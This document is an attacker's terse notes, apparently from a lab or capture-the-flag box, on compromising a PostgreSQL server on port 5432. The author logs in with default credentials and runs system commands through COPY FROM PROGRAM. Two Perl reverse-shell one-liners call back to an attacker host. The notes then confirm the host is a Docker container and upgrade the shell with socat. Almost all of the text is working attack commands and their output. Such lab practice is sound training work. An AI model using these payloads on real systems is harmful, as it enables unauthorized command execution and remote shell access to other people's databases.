# 4 :5432 postgres

```
# default creds worked

$ psql -h 192.168.197.60 -p 5432 -U postgres
Password for user postgres:
psql (13.4 (Debian 13.4-2), server 12.3 (Debian 12.3-1.pgdg100+1))
Type "help" for help.

postgres=# \l
                                 List of databases
   Name    |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges
-----------+----------+----------+------------+------------+-----------------------
 postgres  | postgres | UTF8     | en_US.utf8 | en_US.utf8 |
 template0 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
           |          |          |            |            | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
           |          |          |            |            | postgres=CTc/postgres


# using postgres exploit
postgres=# \c postgres;
psql (13.4 (Debian 13.4-2), server 12.3 (Debian 12.3-1.pgdg100+1))
You are now connected to database "postgres" as user "postgres".
postgres=# DROP TABLE IF EXISTS kashz;
DROP TABLE
postgres=# CREATE TABLE kashz(out text);
CREATE TABLE
postgres=# COPY kashz FROM PROGRAM 'whoami;id;hostname;uname -a';
COPY 7
postgres=# SELECT * from kashz;
                                           out
-----------------------------------------------------------------------------------------
 postgres
 uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
 326cfee15738
 Linux 326cfee15738 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux

# works
# no python, nc using perl shell
# /bin/sh shell
COPY kashz FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.49.197:10000");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
# /bin/bash shel
COPY kashz FROM PROGRAM 'perl -e ''use Socket;$i="192.168.49.197";$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};''';
# stable if needed
perl -e 'exec "/bin/bash";'


$ nc -lvnp 10000
whoami;id;hostname
postgres
uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
326cfee15738

# hostname feels weird; maybe docker?
# no wget, curl, python WOW!

# check if machine is docker container
postgres@326cfee15738:/home$ cat /proc/1/cgroup
10:pids:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
9:perf_event:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
8:devices:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
7:freezer:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
6:memory:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
5:blkio:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
4:net_cls,net_prio:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
3:cpuset:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
2:cpu,cpuacct:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
1:name=systemd:/docker/326cfee157384615c872763b1a690d34c59650bfc4a9007be1df15b81b6d7bfb
# definitely docker 

# stable using socat

#kali
$ socat TCP-L:5432 FILE:`tty`,raw,echo=0
# victim
./socat64 TCP:192.168.49.197:5432 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
